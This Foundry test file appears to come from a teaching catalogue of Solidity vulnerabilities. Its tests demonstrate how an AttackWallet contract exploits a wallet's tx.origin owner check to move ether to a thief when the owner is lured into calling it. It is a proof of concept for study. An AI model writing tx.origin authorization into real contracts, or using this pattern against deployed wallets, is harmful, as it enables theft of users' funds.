pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/8.1.1-Wrong-Caller-Identification-vulnerability.sol";

contract ExploitTest is Test {
    UserWallet public userWallet;
    AttackWallet public attackWallet;

    // Predefined addresses for clarity
    address payable owner = payable(address(0xABcD));
    address payable thief = payable(address(0xbEEF));
    address nonOwner = address(0xDEAD);

    function setUp() public {
        // Fund the test accounts
        vm.deal(owner, 10 ether);
        vm.deal(thief, 0);
        vm.deal(nonOwner, 10 ether);

        // Deploy UserWallet from the owner with an initial balance. 
        // Note: UserWallet sets its owner using msg.sender in the constructor.
        vm.startPrank(owner);
        userWallet = new UserWallet{value: 2 ether}();
        vm.stopPrank();

        // Deploy the AttackWallet. It will be used to exploit the userWallet using tx.origin
        attackWallet = new AttackWallet(payable(userWallet), thief);
    }

    // Test that a direct call by a non-owner to UserWallet.transfer fails as expected
    function testDirectCallByNonOwner() public {
        vm.prank(nonOwner);
        vm.expectRevert(bytes("Not owner"));
        userWallet.transfer(payable(nonOwner), 1 ether);
    }

    // Test the exploit scenario where the owner inadvertently triggers the attack
    function testExploitUsingAttackWallet() public {
        // Record initial balances
        uint userWalletBalanceBefore = address(userWallet).balance;
        uint thiefBalanceBefore = thief.balance;

        // The vulnerability: using tx.origin for access control. 
        // When the owner sends a transaction to the AttackWallet, tx.origin remains the owner,
        // causing the UserWallet.transfer check to pass, even though the call is mediated by AttackWallet.
        
        // The owner is tricked into calling the AttackWallet contract by sending 1 ether.
        vm.startPrank(owner, owner);
        (bool success, ) = address(attackWallet).call{value: 1 ether}(hex"");
        require(success, "AttackWallet call failed");
        vm.stopPrank();

        // After the call, AttackWallet's fallback function invokes UserWallet.transfer,
        // transferring an amount equal to AttackWallet's balance (i.e. 1 ether) from UserWallet to thief.
        uint userWalletBalanceAfter = address(userWallet).balance;
        uint thiefBalanceAfter = thief.balance;

        assertEq(userWalletBalanceBefore - userWalletBalanceAfter, 1 ether, "UserWallet should lose 1 ether");
        assertEq(thiefBalanceAfter - thiefBalanceBefore, 1 ether, "Thief should receive 1 ether");
    }
}
